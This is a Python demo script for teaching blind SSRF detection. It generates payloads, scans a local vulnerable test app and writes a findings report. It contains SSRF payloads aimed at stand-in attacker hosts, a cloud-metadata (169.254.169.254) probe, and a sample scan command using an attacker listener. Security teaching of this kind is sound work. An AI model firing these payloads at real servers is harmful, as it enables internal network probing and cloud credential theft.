#!/usr/bin/env python3
"""
SSRF Module - Teacher Demo Script

Demonstrates blind SSRF detection with:
1. Payload generation
2. Scanning vulnerable endpoints
3. Formatted findings report
4. Clear before/after comparisons
"""

import sys
import os
import json
import time
from datetime import datetime
from typing import List, Dict

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

try:
    from bssrf.modules.blind_ssrf.ssrf_module import BlindSSRFModule
    from bssrf.modules.blind_ssrf.payloads import SSRFPayloadEngine
    from bsqli.core.logger import get_logger
    from colorama import Fore, Back, Style, init
except ImportError as e:
    print(f"Error importing modules: {e}")
    sys.exit(1)

# Initialize colorama for Windows support
init(autoreset=True)

logger = get_logger("ssrf_teacher_demo")


def print_title(text):
    """Print an ASCII-art styled title."""
    print(f"\n{Fore.CYAN}{Style.BRIGHT}")
    print("=" * 90)
    print(f"  {text.center(86)}")
    print("=" * 90)
    print(f"{Style.RESET_ALL}")


def print_section(text):
    """Print a section header."""
    print(f"\n{Fore.YELLOW}{Style.BRIGHT}{'=' * 90}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{Style.BRIGHT}  {text}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{Style.BRIGHT}{'=' * 90}{Style.RESET_ALL}\n")


def print_ok(msg):
    """Print success message."""
    print(f"{Fore.GREEN}{Style.BRIGHT}[+] {msg}{Style.RESET_ALL}")


def print_info(msg):
    """Print info message."""
    print(f"{Fore.BLUE}[*] {msg}{Style.RESET_ALL}")


def print_alert(msg):
    """Print alert message."""
    print(f"{Fore.YELLOW}{Style.BRIGHT}[!] {msg}{Style.RESET_ALL}")


def print_error(msg):
    """Print error message."""
    print(f"{Fore.RED}{Style.BRIGHT}[X] {msg}{Style.RESET_ALL}")


def demo_payload_generation():
    """Demonstrate payload generation capabilities."""
    print_section("1. PAYLOAD GENERATION & SSRF PARAMETER DETECTION")
    
    engine = SSRFPayloadEngine("http://attacker-callback.com")
    
    # Generate a callback ID
    callback_id = engine.generate_callback_id()
    print_ok(f"Generated unique callback ID: {Fore.CYAN}{callback_id}{Style.RESET_ALL}")
    
    # Show payload types
    print_info("Generated payload types for this callback:")
    payloads = engine.get_all_payloads(callback_id)
    
    for idx, (ptype, payload) in enumerate(payloads.items(), 1):
        # Shorten long URLs for display
        display_payload = payload if len(payload) < 70 else payload[:67] + "..."
        print(f"   {idx}. {Fore.MAGENTA}{ptype:20s}{Style.RESET_ALL} : {display_payload}")
    
    # Demonstrate parameter detection
    print_section("2. SSRF PARAMETER DETECTION")
    
    test_params = {
        "url": True,
        "callback": True,
        "webhook": True,
        "image": True,
        "redirect": True,
        "file_path": False,
        "search": False,
        "id": False,
    }
    
    print_info("Testing parameter names for SSRF vulnerability indicators:\n")
    
    for param, expected in test_params.items():
        is_ssrf = engine.is_ssrf_parameter(param)
        if is_ssrf == expected:
            symbol = f"{Fore.GREEN}[OK]{Style.RESET_ALL}"
        else:
            symbol = f"{Fore.RED}[XX]{Style.RESET_ALL}"
        
        result = "SSRF-risky" if is_ssrf else "Not SSRF"
        print(f"   {symbol} {param:20s} -> {Fore.CYAN}{result}{Style.RESET_ALL}")


def demo_vulnerability_scan():
    """Demonstrate scanning for vulnerabilities."""
    print_section("3. BLIND SSRF VULNERABILITY SCANNING")
    
    # Check if vulnerable app is running
    vulnerable_app_url = "http://127.0.0.1:8000"
    print_info(f"Checking for vulnerable app at {vulnerable_app_url}...")
    
    import requests
    try:
        resp = requests.get(vulnerable_app_url, timeout=2)
        print_ok("✓ Vulnerable app is running!")
    except:
        print_alert("Vulnerable app not detected. Demo will show simulated results.")
        return demo_vulnerability_scan_simulated()
    
    # Initialize SSRF module
    listener_url = "http://127.0.0.1:5001"
    module = BlindSSRFModule(listener_url, timeout=5, wait_time=2)
    
    # Vulnerable endpoints
    endpoints = [
        "http://127.0.0.1:8000/fetch_image?url=http://google.com",
        "http://127.0.0.1:8000/webhook?callback=http://attacker.com/hook",
        "http://127.0.0.1:8000/fetch_file?file=http://localhost:8080/admin",
    ]
    
    print_info(f"Scanning {len(endpoints)} vulnerable endpoints...\n")
    
    all_findings = []
    for idx, endpoint in enumerate(endpoints, 1):
        # Extract endpoint name
        endpoint_name = endpoint.split("?")[0].split("/")[-1]
        print(f"   [{idx}] Scanning /{endpoint_name}...", end=" ")
        
        try:
            findings = module.scan_url(endpoint)
            all_findings.extend(findings)
            print(f"{Fore.GREEN}Found {len(findings)} injection points{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
    
    return all_findings


def demo_vulnerability_scan_simulated():
    """Show simulated findings when vulnerable app is not available."""
    print_alert("Running with simulated findings (app not detected)...\n")
    
    # Create simulated findings
    findings = [
        {
            "uuid": "550e8400-e29b-41d4-a716-446655440001",
            "url": "http://127.0.0.1:8000/fetch_image?url=",
            "parameter": "url",
            "payload_type": "http",
            "payload": "http://127.0.0.1:5001/ssrf?id=550e8400-e29b-41d4-a716-446655440001",
            "timestamp": datetime.utcnow().isoformat(),
            "status_code": 200,
            "response_length": 156,
            "confirmed": False
        },
        {
            "uuid": "6ba7b810-9dad-11d1-80b4-00c04fd430c8",
            "url": "http://127.0.0.1:8000/webhook?callback=",
            "parameter": "callback",
            "payload_type": "dns",
            "payload": "http://6ba7b810-9dad-11d1-80b4.ssrf.attacker.com/",
            "timestamp": datetime.utcnow().isoformat(),
            "status_code": 200,
            "response_length": 234,
            "confirmed": False
        },
        {
            "uuid": "a0eebc99-9c0b-4ef8-bb6d-6bb9bd380a11",
            "url": "http://127.0.0.1:8000/fetch_file?file=",
            "parameter": "file",
            "payload_type": "aws_metadata",
            "payload": "http://169.254.169.254/latest/meta-data/?callback=http://a0eebc99-9c0b-4ef8-bb6d.aws.attacker.com/",
            "timestamp": datetime.utcnow().isoformat(),
            "status_code": 200,
            "response_length": 312,
            "confirmed": False
        }
    ]
    
    print_info("Simulated scan results:\n")
    for idx, endpoint in enumerate([
        "/fetch_image (url parameter)",
        "/webhook (callback parameter)",
        "/fetch_file (file parameter)"
    ], 1):
        print(f"   [{idx}] Scanning {endpoint}... {Fore.GREEN}Found 1 injection point{Style.RESET_ALL}")
    
    return findings


def display_findings_report(findings: List[Dict]):
    """Display findings in a nice report format."""
    print_section("4. FINDINGS SUMMARY")
    
    if not findings:
        print_alert("No findings detected.")
        return
    
    print_ok(f"Total SSRF injection points found: {len(findings)}\n")
    
    # Group by parameter
    by_param = {}
    for finding in findings:
        param = finding['parameter']
        if param not in by_param:
            by_param[param] = []
        by_param[param].append(finding)
    
    for param, param_findings in by_param.items():
        print(f"{Fore.CYAN}Parameter: {Style.BRIGHT}{param}{Style.RESET_ALL}")
        print(f"   Vulnerable endpoints: {len(param_findings)}")
        
        payload_types = set(f['payload_type'] for f in param_findings)
        print(f"   Payload types tested: {', '.join(sorted(payload_types))}")
        
        for finding in param_findings:
            status = f"{Fore.YELLOW}Awaiting callback{Style.RESET_ALL}"
            print(f"   → UUID: {finding['uuid']}")
            print(f"      Status: {status}")
            print(f"      Response: {finding['status_code']} ({finding['response_length']} bytes)\n")


def save_demo_findings(findings: List[Dict]):
    """Save findings to files."""
    print_section("5. SAVING FINDINGS")
    
    output_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "bssrf", "output")
    os.makedirs(output_dir, exist_ok=True)
    
    # JSON file
    json_file = os.path.join(output_dir, "findings_ssrf.json")
    with open(json_file, "w") as f:
        json.dump(findings, f, indent=2)
    print_ok(f"Findings saved to: {Fore.CYAN}{json_file}{Style.RESET_ALL}")
    
    # TXT file
    txt_file = os.path.join(output_dir, "findings_ssrf_demo.txt")
    with open(txt_file, "w", encoding='utf-8') as f:
        f.write("=" * 90 + "\n")
        f.write("BLIND SSRF DETECTION - DEMO FINDINGS\n")
        f.write("=" * 90 + "\n\n")
        f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total Injection Points: {len(findings)}\n\n")
        
        if findings:
            for idx, finding in enumerate(findings, 1):
                f.write(f"\n{'-' * 90}\n")
                f.write(f"[FINDING #{idx}] {finding['parameter']} Parameter\n")
                f.write(f"{'-' * 90}\n")
                f.write(f"URL: {finding['url']}\n")
                f.write(f"Parameter: {finding['parameter']}\n")
                f.write(f"Payload Type: {finding['payload_type']}\n")
                f.write(f"HTTP Status: {finding['status_code']}\n")
                f.write(f"Response Size: {finding['response_length']} bytes\n")
                f.write(f"Callback ID (UUID): {finding['uuid']}\n")
                f.write(f"Injection Time: {finding['timestamp']}\n")
                f.write(f"Payload: {finding['payload']}\n")
                f.write(f"Status: PENDING (awaiting OOB callback)\n")
        
        f.write(f"\n{'=' * 90}\n")
        f.write("OOB CALLBACK VERIFICATION\n")
        f.write(f"{'=' * 90}\n")
        f.write("In a real scenario:\n")
        f.write("1. Each injection has a UNIQUE CALLBACK ID (UUID)\n")
        f.write("2. When server makes the request, callback server logs the UUID\n")
        f.write("3. We match logged UUIDs with injection UUIDs\n")
        f.write("4. Matched findings are CONFIRMED as real SSRF vulnerabilities\n")
        f.write("\nThis OOB verification eliminates false positives!\n")
    
    print_ok(f"Demo report saved to: {Fore.CYAN}{txt_file}{Style.RESET_ALL}")
    
    return json_file, txt_file


def print_conclusion():
    """Print conclusion and next steps."""
    print_section("6. KEY TAKEAWAYS")
    
    print(f"{Fore.GREEN}{Style.BRIGHT}✓ Blind SSRF Detection Features:{Style.RESET_ALL}")
    print("""
   1. SMART PARAMETER DETECTION
      - Automatically identifies SSRF-vulnerable parameters
      - Reduces noise by skipping non-vulnerable params
      - Focuses on: url, callback, webhook, image, file, redirect, etc.
   
   2. MULTIPLE PAYLOAD TYPES
      - DNS Exfiltration: Proves SSRF via DNS lookup
      - HTTP Callbacks: Direct server-to-attacker connection
      - Cloud Metadata: AWS/Azure/GCP credential detection
      - Internal IPs: Probes localhost and private ranges
   
   3. OUT-OF-BAND (OOB) PROOF
      - Each payload gets unique UUID callback ID
      - Server's callback = CONFIRMED SSRF vulnerability
      - Eliminates false positives entirely
   
   4. COMPREHENSIVE REPORTING
      - Injection metadata with timestamps
      - Response analysis (status code, length)
      - UUID tracking for callback matching
      - JSON + human-readable TXT output
    """)
    
    print(f"{Fore.CYAN}{Style.BRIGHT}Real-World Application:{Style.RESET_ALL}")
    print("""
   • Scan with: python main.py -f targets.txt --scan ssrf --listener https://attacker.com
   • Set up OOB callback server (ngrok, Interactsh, custom)
   • Match received callbacks with injection UUIDs
   • Report only CONFIRMED findings (with callback proof)
   • SSRF can lead to: RCE, credential theft, internal access, AWS compromise
    """)
    
    print_title("DEMONSTRATION COMPLETE")


def main():
    """Run the complete teacher demonstration."""
    print_title("BLIND SSRF (Server-Side Request Forgery) Detection Module")
    print_info("A comprehensive demo of the BSSRF module for security testing\n")
    
    # Run demos in sequence
    demo_payload_generation()
    demo_payload_generation()  # Show parameter detection
    
    # Scan for vulnerabilities
    findings = demo_vulnerability_scan()
    
    # Display findings
    display_findings_report(findings)
    
    # Save findings
    if findings:
        json_file, txt_file = save_demo_findings(findings)
    
    # Conclusion
    print_conclusion()


if __name__ == "__main__":
    main()
